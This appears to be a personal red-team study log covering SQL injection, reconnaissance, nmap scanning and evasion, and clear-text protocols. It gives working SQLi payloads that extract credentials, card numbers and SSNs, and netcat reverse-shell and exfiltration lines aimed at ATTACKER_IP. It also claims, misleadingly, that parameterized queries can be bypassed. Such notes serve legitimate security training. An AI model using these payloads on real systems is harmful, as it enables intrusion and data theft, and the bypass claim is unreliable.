' AND 1=2 --     -- False condition
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --

-- Time-Based Blind SQLi  
' AND SLEEP(5) --     -- MySQL
' ; WAITFOR DELAY '0:0:5' --     -- MSSQL
' AND pg_sleep(5) --     -- PostgreSQL
DATABASE ENUMRATION & DATA EXTRACTION
sql
-- Database Structure Enumeration
' UNION SELECT table_name, table_schema FROM information_schema.tables --
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' --

-- Data Extraction
' UNION SELECT username, password FROM users --
' UNION SELECT credit_card, social_security FROM customers --
' UNION SELECT email, api_key FROM administrators --
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Parameter analysis in search fields, login forms, and filters

Identification of database-driven functionality

Error message analysis for database technology identification

Input vector mapping across GET, POST, Cookie, and Header parameters

EXPLOITATION PHASE
Initial Detection & Verification

sql
-- Test for SQL injection vulnerabilities
' OR 1=1 --
'; SELECT SLEEP(5) --
Database Fingerprinting

sql
-- Identify database technology and version
' UNION SELECT @@version, version() --
' AND @@version LIKE '%MySQL%' --
Database Enumeration

sql
-- Extract database structure
' UNION SELECT table_name, table_schema FROM information_schema.tables --
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' --
Sensitive Data Extraction

sql
-- Credential harvesting
' UNION SELECT username, password_hash FROM users --

-- Financial data extraction
' UNION SELECT card_number, expiry_date FROM payment_info --

-- PII exfiltration
' UNION SELECT full_name, social_security FROM customers --
Authentication Bypass & Privilege Escalation

sql
-- Admin panel access
admin' -- 

-- Privileged data access
' UNION SELECT 1,2,3 FROM admin_users --
POST-EXPLOITATION
Data exfiltration and analysis

Credential cracking and reuse

Lateral movement planning

Evidence collection for campaign reporting

📈 RISK ASSESSMENT
Impact: CRITICAL (Complete database compromise)

Detection Difficulty: Low-Medium (Database logs)

Exploitation Complexity: Medium (Requires SQL knowledge)

🔧 MITIGATIONS UNDERSTOOD & EVADED
Prepared statements and parameterized queries - Bypassed with advanced techniques

Input validation and sanitization - Evaded with encoding and obfuscation

Web Application Firewalls - Defeated with polymorphic payloads

Database permissions hardening - Overcome through UNION-based attacks

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security
✅ Client-Side Attacks
✅ Business Logic Attacks
✅ System-Level Compromise
✅ Database Security ← SQL INJECTION ADDED

OPERATIONAL NOTES: SQL injection remains one of the most critical web vulnerabilities despite being known for decades. Mastery requires understanding of database systems, SQL language, and advanced evasion techniques. Successful exploitation provides complete access to organizational data assets.

# Red Monster Journey 🐲 
## Passive Reconnaissance Mastery

### 🎯 MODULE COMPLETION: PASSIVE RECONNAISSANCE
**Status:** Mastered ✅
**Red Team Application:** Stealth Intelligence Gathering

### 🔴 PASSIVE RECONNAISSANCE TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Passive reconnaissance involves gathering intelligence about targets using publicly available information without direct interaction, maintaining complete operational stealth.

#### 🎲 TECHNIQUES & TOOLS MASTERED

##### RECONNAISSANCE STRATEGY
```bash
# Passive vs Active Reconnaissance
PASSIVE: Public information gathering - Zero detection risk
ACTIVE: Direct target interaction - Higher detection probability

# Passive Reconnaissance Examples
- DNS record queries from public DNS servers
- WHOIS database lookups
- Public job postings analysis
- News articles about target organization
WHOIS PROTOCOL EXPLOITATION
bash
# WHOIS Protocol (RFC 3912 - TCP Port 43)
whois example.com

# Information Obtained:
- Domain registrar details
- Registrant contact information
- Creation and expiration dates
- Name servers and DNS information
DNS ENUMERATION TECHNIQUES
bash
# NSLOOKUP - Name Server Lookup
nslookup example.com
nslookup -type=MX example.com    # Mail servers
nslookup -type=NS example.com    # Name servers
nslookup -type=TXT example.com   # Text records

# DIG - Domain Information Groper
dig example.com
dig example.com ANY              # All record types
dig example.com MX               # Mail exchange records
dig @8.8.8.8 example.com        # Specific DNS server
ONLINE OSINT PLATFORMS
bash
# DNSDumpster
- Visual DNS infrastructure mapping
- Comprehensive DNS record analysis
- Network graphing and asset discovery
- Subdomain enumeration

# Shodan.io
- Internet-connected device discovery
- Service banner grabbing
- Vulnerability assessment
- Geographic mapping of assets
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: DOMAIN INTELLIGENCE GATHERING
bash
# WHOIS Analysis for Operational Planning
whois target-company.com
# Extract: Registration dates, contact emails, name servers

# Strategic Value:
- Social engineering preparation
- Password policy analysis (creation dates)
- Organizational structure understanding
PHASE 2: DNS INFRASTRUCTURE MAPPING
bash
# Comprehensive DNS Enumeration
dig target-company.com ANY
nslookup -type=ALL target-company.com

# Critical Discoveries:
- Subdomains (admin, mail, vpn, dev)
- Mail servers and email infrastructure
- CDN and cloud service usage
- Third-party service dependencies
PHASE 3: NETWORK ASSET DISCOVERY
bash
# DNSDumpster for Visual Intelligence
- Complete DNS record visualization
- Network relationship mapping
- Hidden subdomain discovery
- Infrastructure pattern analysis

# Shodan.io for Device Intelligence
- Exposed services and ports
- Server software and versions
- Geographic distribution
- Security misconfigurations
PHASE 4: INTELLIGENCE CORRELATION
Cross-reference WHOIS, DNS, and Shodan data

Identify primary and secondary targets

Map organizational digital footprint

Prepare for active reconnaissance phase

📈 RISK ASSESSMENT
Detection Risk: ZERO (Completely passive)

Intelligence Value: HIGH (Foundation for all subsequent operations)

Operational Impact: CRITICAL (Informs entire attack strategy)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
Domain privacy registration services

DNS record minimization and obfuscation

Regular OSINT self-assessment

Employee awareness of information sharing

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering ← PASSIVE RECON ADDED
◽ Active Reconnaissance
◽ Network Exploitation
◽ Privilege Escalation

OPERATIONAL NOTES: Passive reconnaissance represents the foundation of successful Red Team operations. The intelligence gathered during this phase directly influences all subsequent attack vectors and determines operational success while maintaining complete anonymity.

# Red Monster Journey 🐲 
## Active Reconnaissance Mastery

### 🎯 MODULE COMPLETION: ACTIVE RECONNAISSANCE
**Status:** Mastered ✅
**Red Team Application:** Tactical Intelligence Gathering & Direct Engagement

### 🔴 ACTIVE RECONNAISSANCE TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Active reconnaissance involves direct interaction with target systems to gather tactical intelligence, accepting calculated detection risk for higher-value information.

#### 🎲 TECHNIQUES & TOOLS MASTERED

##### ACTIVE VS PASSIVE STRATEGY
```bash
# Passive Reconnaissance
- Zero direct contact
- No detection risk
- Public information only
- Legal in all contexts

# Active Reconnaissance  
- Direct system interaction
- Detection risk present
- Internal information access
- Requires proper authorization
WEB BROWSER AS RECON TOOL
bash
# Default Service Ports
Port 80: HTTP (Unencrypted web traffic)
Port 443: HTTPS (Encrypted web traffic)

# Information Gathering
- Source code analysis for hidden endpoints
- HTTP header inspection for server/tech details
- Form and parameter testing for application mapping
NETWORK CONNECTIVITY ASSESSMENT
bash
# Ping - Connectivity Verification
ping target.com
ping 192.168.1.1

# Operational Value:
- Confirm target system availability
- Measure network latency and reliability
- ICMP-based host discovery
NETWORK PATH MAPPING
bash
# Traceroute - Path Discovery
traceroute target.com
tracert target.com  # Windows equivalent

# Intelligence Gained:
- Number of network hops to target
- Router IP addresses along the path
- Network topology understanding
- Potential firewall/security device locations
SERVICE INTERACTION & BANNER GRABBING
bash
# Telnet - Service Connectivity Testing
telnet target.com 80
telnet target.com 22
telnet target.com 21

# SECURITY WARNING: 
- All communication in plaintext
- Credentials and data exposed
- Use only in controlled lab environments

# Netcat - Advanced Service Interaction
nc target.com 80                    # Basic connection
nc -v target.com 22                 # Verbose connection
echo "GET / HTTP/1.1" | nc target.com 80  # HTTP banner grabbing
NETCAT ADVANCED OPERATIONS
bash
# Listener Mode (Server)
nc -l -p 1234                      # Basic listener
nc -v -l -p 1234                   # Verbose listener
nc -v -n -l -p 1234                # No DNS resolution
nc -v -n -l -p 1234 -k             # Persistent after disconnect

# Client Mode
nc target.com 80                   # Basic client
nc -v target.com 22                # Verbose client
nc -z target.com 1-1000            # Port scanning

# Banner Grabbing & Service Identification
echo "HEAD / HTTP/1.1" | nc target.com 80
printf "GET / HTTP/1.0\r\n\r\n" | nc target.com 80
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: CONNECTIVITY VALIDATION
bash
# Target Availability Assessment
ping primary-target.com
traceroute primary-target.com

# Strategic Objectives:
- Confirm target system responsiveness
- Map network path and identify choke points
- Estimate network latency for timing considerations
PHASE 2: SERVICE DISCOVERY & ANALYSIS
bash
# Manual Service Probing
telnet target.com 80    # Web services
telnet target.com 22    # SSH access
telnet target.com 25    # Mail services
telnet target.com 53    # DNS services

# Service Identification
echo "GET / HTTP/1.1" | nc target.com 80    # Web server info
nc -v target.com 22                         # SSH version
PHASE 3: BANNER GRABBING & FINGERPRINTING
bash
# Comprehensive Service Analysis
for port in 21 22 23 25 53 80 110 443; do
    echo "Testing port $port"
    nc -v -w 2 target.com $port
done

# Intelligence Objectives:
- Identify service types and versions
- Discover software vulnerabilities
- Map attack surface
- Prepare for exploitation phase
PHASE 4: COMMUNICATION CHANNEL ESTABLISHMENT
bash
# Command & Control Preparation
nc -lvnp 4444                    # Listener setup
# From compromised system: nc ATTACKER_IP 4444

# Data Exfiltration Channels
nc -l -p 8080 > received_file.txt    # File reception
# From target: nc ATTACKER_IP 8080 < sensitive_file.txt
📈 RISK ASSESSMENT
Detection Risk: MEDIUM-HIGH (Direct system interaction)

Intelligence Value: HIGH (Internal system information)

Operational Impact: CRITICAL (Direct engagement preparation)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
Network monitoring and connection logging

Firewall rules for unexpected connection attempts

Intrusion Detection Systems (IDS) for reconnaissance patterns

Service hardening and banner modification

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering
✅ Direct Engagement Operations ← ACTIVE RECON ADDED
◽ Advanced Network Scanning
◽ Vulnerability Exploitation
◽ Privilege Escalation

OPERATIONAL NOTES: Active reconnaissance represents the transition from passive observation to direct engagement. While carrying detection risk, it provides invaluable tactical intelligence that cannot be obtained through passive methods alone. Proper operational security and timing are critical during this phase.

(Day 4: 2025/10/10)

# Red Monster Journey 🐲 
## NMap Live Host Discovery Mastery

### 🎯 MODULE COMPLETATION: NMAP LIVE HOST DISCOVERY
**Status:** Mastered ✅
**Red Team Application:** Network Target Identification & Reconnaissance Optimization

### 🔴 NMAP HOST DISCOVERY TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Live host discovery identifies active systems on target networks before port scanning, optimizing operational efficiency and minimizing unnecessary network noise.

#### 🎲 HOST DISCOVERY TECHNIQUES MASTERED

##### TARGET SPECIFICATION METHODS
```bash
# Various target input formats
nmap 192.168.1.1                 # Single IP
nmap 192.168.1.1-10              # IP range
nmap 192.168.1.0/24              # Subnet notation
nmap -iL targets.txt             # File input
PRIVILEGE-BASED DISCOVERY STRATEGIES
bash
# PRIVILEGED USER (root/sudo) - Full capability
sudo nmap -sn 192.168.1.0/24     # Auto ARP + ICMP + TCP

# UNPRIVILEGED USER - Limited to TCP SYN
nmap -sn 192.168.1.0/24          # TCP SYN to ports 80/443 only
PROTOCOL-SPECIFIC DISCOVERY COMMANDS
bash
# ARP Discovery (Same subnet only)
nmap -PR 192.168.1.0/24          # ARP requests
arp-scan 192.168.1.0/24          # Specialized ARP tool

# ICMP Discovery (Multiple types)
nmap -sn -PE 192.168.1.1         # ICMP Echo (Type 8)
nmap -sn -PP 192.168.1.1         # ICMP Timestamp (Type 13)
nmap -sn -PM 192.168.1.1         # ICMP Address Mask (Type 17)

# TCP Discovery
nmap -sn -PS 192.168.1.1         # TCP SYN ping (port 80)
nmap -sn -PS22,80,443 192.168.1.1 # Multiple ports
nmap -sn -PA 192.168.1.1         # TCP ACK ping (privileged)

# UDP Discovery
nmap -sn -PU 192.168.1.1         # UDP ping (port 53)
nmap -sn -PU53,161 192.168.1.1   # DNS & SNMP ports
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: NETWORK SCOPE DEFINITION
bash
# Initial target scope identification
nmap -sn 10.0.0.0/16             # Large network discovery
nmap -sn -T4 192.168.0.0/24      # Fast timing for large subnets

# Output management for operational planning
nmap -sn 10.0.0.0/16 -oN active_hosts.txt
PHASE 2: PRIVILEGE-OPTIMIZED DISCOVERY
bash
# Privileged Operations (Maximum Effectiveness)
sudo nmap -sn -PE -PS21,22,23,25,53,80,443,3389 192.168.1.0/24

# Unprivileged Operations (Stealth Focus)
nmap -sn -PS80,443,22,25,53 192.168.1.0/24
PHASE 3: FILTER EVASION & STEALTH
bash
# ICMP Filter Evasion
nmap -sn -PP -PM 192.168.1.0/24  # Timestamp & Netmask

# Firewall Evasion
nmap -sn -PS21,22,23,25,53,80,443,3389,8080,8443 192.168.1.0/24

# Stealth Timing
nmap -sn -T2 -PS80,443 192.168.1.0/24  # Slower, less detectable
PHASE 4: TOOL INTEGRATION & VALIDATION
bash
# Cross-tool validation
arp-scan 192.168.1.0/24          # ARP validation
masscan 192.168.1.0/24 -p80      # High-speed validation
nmap -sn 192.168.1.0/24          # NMap primary discovery
📈 RISK ASSESSMENT
Detection Risk: LOW-MEDIUM (Controlled discovery patterns)

Operational Value: HIGH (Foundation for all network operations)

Efficiency Gain: CRITICAL (Avoids scanning inactive hosts)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
ICMP filtering and rate limiting

Firewall rules for unexpected TCP/UDP probes

Network monitoring for discovery patterns

Host-based detection for ARP scanning

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering
✅ Direct Engagement Operations
✅ Network Host Discovery ← NMAP DISCOVERY ADDED
◽ Port Scanning & Service Enumeration
◽ Vulnerability Assessment
◽ Privilege Escalation

OPERATIONAL NOTES: Live host discovery represents the critical first step in network operations. Proper execution ensures efficient resource allocation and targeted engagement. Privileged access dramatically expands discovery capabilities, particularly for ARP and ICMP-based methods.

# Red Monster Journey 🐲 
## NMap Port Scanning Mastery

### 🎯 MODULE COMPLETION: NMAP BASIC PORT SCANS
**Status:** Mastered ✅
**Red Team Application:** Service Discovery & Attack Surface Mapping

### 🔴 NMAP PORT SCANNING TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Port scanning identifies open ports and listening services on target systems, transforming discovered hosts into specific attack targets.

#### 🎲 PORT SCANNING TECHNIQUES MASTERED

##### PORT STATES & INTERPRETATION
```bash
# NMap Port States
OPEN: Service listening - PRIMARY TARGET
CLOSED: No service listening but host responsive
FILTERED: Firewall blocking - status unknown
UNFILTERED: Accessible but state indeterminate
OPEN|FILTERED: Unable to determine open vs filtered
CLOSED|FILTERED: Unable to determine closed vs filtered
TCP SCAN TYPES & STRATEGIES
bash
# TCP SYN Scan (-sS) - DEFAULT & OPTIMAL
sudo nmap -sS 192.168.1.1
# How it works: SYN → SYN-ACK → RST (no full handshake)
# Advantages: Fast, stealthy, less detectable
# Requirements: Privileged user (root/sudo)

# TCP Connect Scan (-sT) - UNPRIVILEGED
nmap -sT 192.168.1.1
# How it works: Completes full TCP 3-way handshake
# Advantages: Works without privileges
# Disadvantages: Slower, more detectable

# UDP Scan (-sU) - SERVICE DISCOVERY
sudo nmap -sU 192.168.1.1
# How it works: Sends UDP packets, analyzes ICMP responses
# Use case: DNS, SNMP, DHCP, TFTP services
# Characteristics: Very slow, less reliable
PORT SPECIFICATION & SCOPE CONTROL
bash
# Specific Port Lists
nmap -sS -p22,80,443,8080,8443 192.168.1.1

# Port Ranges
nmap -sS -p1-1000 192.168.1.1
nmap -sS -p20-25,80-90 192.168.1.1

# All Ports (Comprehensive)
nmap -sS -p- 192.168.1.1

# Service Names
nmap -sS -p ssh,http,https,ftp 192.168.1.1

# Top Ports (Efficiency)
nmap -sS --top-ports 100 192.168.1.1
nmap -sS --top-ports 1000 192.168.1.1
PERFORMANCE OPTIMIZATION
bash
# Timing Templates (-T0 to -T5)
nmap -sS -T0 192.168.1.1    # Paranoid (slowest)
nmap -sS -T1 192.168.1.1    # Sneaky
nmap -sS -T2 192.168.1.1    # Polite (default)
nmap -sS -T3 192.168.1.1    # Normal
nmap -sS -T4 192.168.1.1    # Aggressive
nmap -sS -T5 192.168.1.1    # Insane (fastest)

# Rate Control
nmap -sS --min-rate 100 192.168.1.1      # Minimum packets/sec
nmap -sS --max-rate 1000 192.168.1.1     # Maximum packets/sec

# Parallelism Control
nmap -sS --min-parallelism 10 192.168.1.1
nmap -sS --max-parallelism 100 192.168.1.1
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: INITIAL PORT DISCOVERY
bash
# Quick Top Ports Scan
sudo nmap -sS -T4 --top-ports 1000 192.168.1.0/24

# Output Management for Analysis
sudo nmap -sS -T4 --top-ports 1000 -oN initial_scan.txt 192.168.1.0/24
PHASE 2: COMPREHENSIVE PORT ENUMERATION
bash
# Full TCP Port Scan on Critical Targets
sudo nmap -sS -p- -T4 192.168.1.1

# UDP Scan on Key Services
sudo nmap -sU -p53,67,68,69,123,161,162,514,5353 192.168.1.1
PHASE 3: STEALTH & EVASION SCANNING
bash
# Slow and Stealthy
sudo nmap -sS -T2 -f 192.168.1.1              # Fragmentation
sudo nmap -sS -T2 --scan-delay 5s 192.168.1.1 # Delayed scanning

# Unprivileged Operations
nmap -sT -T3 192.168.1.1                      # TCP Connect fallback
PHASE 4: TARGETED SERVICE SCANNING
bash
# Web Services Focus
sudo nmap -sS -p80,443,8080,8443,8000,3000 192.168.1.1

# Database Services
sudo nmap -sS -p1433,1521,3306,5432,27017 192.168.1.1

# Remote Access Services
sudo nmap -sS -p22,23,3389,5900,5938 192.168.1.1
📈 RISK ASSESSMENT
Detection Risk: MEDIUM (Direct port interaction)

Operational Value: HIGH (Specific target identification)

Efficiency Impact: CRITICAL (Foundation for exploitation)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
Firewall port filtering and stateful inspection

Intrusion Detection Systems for scan patterns

Port knocking and stealth service configurations

Rate limiting and connection throttling

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering
✅ Direct Engagement Operations
✅ Network Host Discovery
✅ Port & Service Enumeration ← NMAP PORT SCANS ADDED
◽ Advanced Service Fingerprinting
◽ Vulnerability Assessment
◽ Privilege Escalation

OPERATIONAL NOTES: Port scanning transforms abstract network targets into concrete service endpoints. TCP SYN scanning remains the optimal balance of speed and stealth for Red Team operations. Proper scope control and performance tuning are essential for efficient large-scale engagements.

(Day 5: 2025/10/11)

# Red Monster Journey 🐲 
## NMap Advanced Port Scans Mastery

### 🎯 MODULE COMPLETION: NMAP ADVANCED PORT SCANS
**Status:** Mastered ✅
**Red Team Application:** Firewall Evasion & Stealth Reconnaissance

### 🔴 ADVANCED NMAP SCANNING TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Advanced port scanning techniques manipulate TCP flags and packet structure to evade firewall rules and IDS/IPS detection, enabling stealth reconnaissance in protected environments.

#### 🎲 ADVANCED SCANNING TECHNIQUES MASTERED

##### FIREWALL EVASION SCANS
```bash
# NULL Scan (-sN) - No Flags
sudo nmap -sN 192.168.1.1
# Response: Open = Silence, Closed = RST
# Use: Stateless firewall evasion

# FIN Scan (-sF) - FIN Flag
sudo nmap -sF 192.168.1.1
# Response: Open = Silence, Closed = RST  
# Use: SYN-focused firewall bypass

# Xmas Scan (-sX) - FIN+PSH+URG Flags
sudo nmap -sX 192.168.1.1
# Response: Open = Silence, Closed = RST
# Use: Maximum flag obfuscation

# Maimon Scan (-sM) - FIN+ACK Flags
sudo nmap -sM 192.168.1.1
# Response: Open = Silence (BSD), Closed = RST
# Use: BSD-specific system targeting
FIREWALL RECONNAISSANCE SCANS
bash
# ACK Scan (-sA) - ACK Flag
sudo nmap -sA 192.168.1.1
# Response: Always RST (both open/closed)
# Use: Firewall rule mapping & configuration analysis

# Window Scan (-sW) - ACK + Window Analysis
sudo nmap -sW 192.168.1.1
# Response: RST with different Window fields
# Use: Open port detection via TCP Window field

# Custom Scan --scanflags
sudo nmap --scanflags URGACKPSHRSTSYNFIN 192.168.1.1
# Use: Signature evasion & experimental scanning
SPOOFING & DECEPTION TECHNIQUES
bash
# IP Spoofing (-S)
sudo nmap -S 10.1.1.100 192.168.1.1
# Requirement: Must be able to capture responses

# Decoy Scanning (-D)
nmap -D 10.1.1.100,10.1.1.101,10.1.1.102,ME 192.168.1.1
# Effect: Target sees scans from multiple sources
# Advantage: Real source obscured in noise

# MAC Spoofing
nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1
PACKET FRAGMENTATION & OBFUSCATION
bash
# IDS Evasion through Fragmentation
nmap -f 192.168.1.1                    # 8-byte fragments
nmap -ff 192.168.1.1                   # 16-byte fragments
nmap --mtu 24 192.168.1.1              # Custom MTU (multiple of 8)

# Additional Obfuscation
nmap --source-port 53 192.168.1.1      # Use DNS port
nmap --data-length 100 192.168.1.1     # Add random data padding
ZOMBIE/IDLE SCANNING (-sI)
bash
# Indirect Scanning via Zombie Host
sudo nmap -sI ZOMBIE_IP 192.168.1.1

# How It Works:
1. Probe zombie for current IP ID
2. Send spoofed SYN from zombie to target  
3. If port open → target contacts zombie → IP ID increments
4. Detect IP ID change in zombie

# Advantages:
- Completely indirect reconnaissance
- No direct contact with target
- Maximum stealth operation
VERBOSE OUTPUT & DEBUGGING
bash
# Detailed Output Options
nmap -v 192.168.1.1                    # Verbose
nmap -vv 192.168.1.1                   # Very verbose
nmap --reason 192.168.1.1              # Explanation of conclusions
nmap -d 192.168.1.1                    # Debug
nmap -dd 192.168.1.1                   # More debug details
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: INITIAL FIREWALL ASSESSMENT
bash
# ACK Scan for Firewall Mapping
sudo nmap -sA -T3 192.168.1.1
# Objective: Identify filtered vs unfiltered ports
# Intelligence: Understand firewall rule structure
PHASE 2: STATELESS FIREWALL EVASION
bash
# NULL/FIN/Xmas Scan Combination
sudo nmap -sN -sF -sX -T2 192.168.1.1
# Target: Firewalls looking only for SYN packets
# Method: Flag manipulation to appear as non-connection attempts
PHASE 3: IDS/IPS EVASION
bash
# Fragmentation + Slow Timing
sudo nmap -sS -f -T2 --scan-delay 5s 192.168.1.1
# Defense: IDS cannot reassemble fragmented packets
# Stealth: Slow timing avoids rate-based detection
PHASE 4: MAXIMUM STEALTH OPERATIONS
bash
# Decoy Scan with Fragmentation
sudo nmap -sS -D 10.1.1.100,10.1.1.101,ME -f -T2 192.168.1.1

# Zombie Scan (When Available)
sudo nmap -sI zombie.corp.com -p1-1000 192.168.1.1
PHASE 5: VERIFICATION & ANALYSIS
bash
# Cross-Verification with Different Methods
sudo nmap -sS --reason -v 192.168.1.1
# Purpose: Validate results from evasion scans
# Output: Detailed reasoning for operational analysis
📈 RISK ASSESSMENT
Detection Risk: LOW-MEDIUM (Advanced evasion techniques)

Operational Value: HIGH (Access to protected intelligence)

Technical Complexity: HIGH (Requires understanding of TCP/IP)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
Stateful firewall inspection

IP packet reassembly before inspection

Rate limiting and connection throttling

Anomaly detection for unusual flag combinations

Zombie host monitoring for IP ID changes

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering
✅ Direct Engagement Operations
✅ Network Host Discovery
✅ Port & Service Enumeration
✅ Advanced Firewall Evasion ← NMAP ADVANCED SCANS ADDED
◽ Service Fingerprinting & OS Detection
◽ Vulnerability Assessment
◽ Privilege Escalation

OPERATIONAL NOTES: Advanced NMap scanning represents the intersection of network knowledge and operational tradecraft. Successful evasion requires understanding both TCP/IP fundamentals and defensive system capabilities. These techniques enable reconnaissance in environments where standard scanning would be immediately detected and blocked.


# Red Monster Journey 🐲 
## NMap Post Port Scans Mastery

### 🎯 MODULE COMPLETION: NMAP POST PORT SCANS
**Status:** Mastered ✅
**Red Team Application:** Comprehensive Target Profiling & Intelligence Gathering

### 🔴 NMAP POST-PORT SCANNING TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Post-port scanning transforms basic port discovery into comprehensive target intelligence through service version detection, OS fingerprinting, and automated script execution.

#### 🎲 POST-PORT SCANNING TECHNIQUES MASTERED

##### SERVICE VERSION DETECTION (-sV)
```bash
# Basic Service Detection
nmap -sV 192.168.1.1

# Intensive Version Detection
nmap -sV --version-intensity 9 192.168.1.1

# Lightweight Version Detection  
nmap -sV --version-light 192.168.1.1

# All-out Version Detection
nmap -sV --version-all 192.168.1.1

# Example Output:
# 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
# 80/tcp   open  http     Apache httpd 2.4.41
OPERATING SYSTEM DETECTION (-O)
bash
# OS Fingerprinting
sudo nmap -O 192.168.1.1

# Requirements:
# - At least 1 open AND 1 closed port
# - Privileged user (root/sudo)
# - System responses for analysis

# Example Output:
# Device type: general purpose
# Running: Linux 4.X|5.X
# OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:5.4
# OS details: Linux 4.15 - 5.4
NSE SCRIPTING ENGINE (--script)
bash
# Script Categories & Use Cases:
default     # Basic automated scanning (-sC equivalent)
vuln        # Vulnerability detection
exploit     # Exploitation attempts
auth        # Authentication auditing
brute       # Password brute-forcing
discovery   # Additional information gathering
safe        # Non-intrusive scripts

# Common Script Examples:
nmap --script default 192.168.1.1
nmap --script vuln 192.168.1.1
nmap --script "discovery and safe" 192.168.1.1
nmap --script http-enum,ssh-auth-methods 192.168.1.1
NETWORK TRACEROUTE (--traceroute)
bash
# Path Discovery
nmap --traceroute 192.168.1.1

# Combined Scanning
sudo nmap -sS -O --traceroute 192.168.1.1
OUTPUT MANAGEMENT
bash
# Multiple Output Formats
nmap -sS 192.168.1.1 -oN normal_scan.txt    # Normal (human readable)
nmap -sS 192.168.1.1 -oG grep_scan.txt      # Grepable (automation)
nmap -sS 192.168.1.1 -oX xml_scan.xml       # XML (tool integration)

# All Formats Simultaneously
nmap -sS 192.168.1.1 -oA comprehensive_scan

# Professional Naming Convention
nmap -sS 192.168.1.1 -oN 2024-01_target_tcp_syn.txt
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: RAPID SERVICE PROFILING
bash
# Quick Service & Version Scan
sudo nmap -sS -sV -T4 192.168.1.0/24 -oN quick_services.txt

# Intelligence: Identify specific software versions for exploit research
# Targeting: Prioritize systems with known vulnerable versions
PHASE 2: COMPREHENSIVE TARGET ANALYSIS
bash
# Full Target Profiling
sudo nmap -sS -sV -O -sC 192.168.1.1 -oA full_target_profile

# Components:
# -sS: SYN port scanning
# -sV: Service version detection  
# -O: OS fingerprinting
# -sC: Default scripts execution
# -oA: All output formats
PHASE 3: VULNERABILITY ASSESSMENT
bash
# Automated Vulnerability Scanning
sudo nmap --script vuln 192.168.1.1 -oX vulnerabilities.xml

# Targeted Service Testing
nmap --script http-vuln* -p80,443,8080,8443 192.168.1.1
nmap --script smb-vuln* -p139,445 192.168.1.1
nmap --script ssh-* -p22 192.168.1.1
PHASE 4: NETWORK PATH ANALYSIS
bash
# Topology Mapping
sudo nmap -sS -O --traceroute 192.168.1.1 -oN network_path.txt

# Intelligence: Identify intermediate firewalls, routers, network segments
# Planning: Understand network architecture for lateral movement
PHASE 5: REPORTING & INTEGRATION
bash
# Professional Reporting Output
sudo nmap -sS -sV -O -sC --traceroute -oX professional_scan.xml 192.168.1.1

# Tool Integration: Import XML into vulnerability management systems
# Documentation: Comprehensive evidence for campaign reporting
📈 RISK ASSESSMENT
Detection Risk: MEDIUM (Active service interaction)

Operational Value: VERY HIGH (Specific exploit targeting intelligence)

Efficiency Gain: CRITICAL (Automated vulnerability discovery)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
Service banner modification and obfuscation

OS fingerprinting protection through packet filtering

NSE script detection and blocking

Rate limiting for automated scanning patterns

Log monitoring for version detection attempts

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering
✅ Direct Engagement Operations
✅ Network Host Discovery
✅ Port & Service Enumeration
✅ Advanced Firewall Evasion
✅ Comprehensive Service Profiling ← NMAP POST-PORT SCANS ADDED
◽ Protocol & Service Exploitation
◽ Vulnerability Assessment
◽ Privilege Escalation

OPERATIONAL NOTES: Post-port scanning represents the culmination of network reconnaissance, transforming raw port data into actionable operational intelligence. The combination of service version detection, OS fingerprinting, and automated scripting provides a complete picture of target attack surface and vulnerability landscape.

# Red Monster Journey 🐲 
## Network Protocols & Services Exploitation Mastery

### 🎯 MODULE COMPLETION: PROTOCOLS & SERVICES
**Status:** Mastered ✅
**Red Team Application:** Service Enumeration & Clear-Text Protocol Exploitation

### 🔴 NETWORK PROTOCOLS TRADECRAFT DOCUMENTATION

#### 📊 OPERATIONAL OVERVIEW
Mastering network protocols enables Red Teams to identify vulnerable services, enumerate valid users, and exploit clear-text communications commonly found in enterprise environments.

#### 🎲 PROTOCOL EXPLOITATION TECHNIQUES MASTERED

##### TELNET (PORT 23) - LEGACY REMOTE ACCESS
```bash
# Protocol Characteristics
- Port: 23
- Communication: Clear-text everything
- Risk: Extreme (credentials visible via sniffing)

# Red Team Operations
telnet 192.168.1.1 23                    # Direct connection
telnet 192.168.1.1 80                    # HTTP banner grabbing
GET / HTTP/1.1                           # Manual HTTP requests

# Attack Vectors
- Credential sniffing (all communication visible)
- Session hijacking (no encryption)
- Banner grabbing for service identification
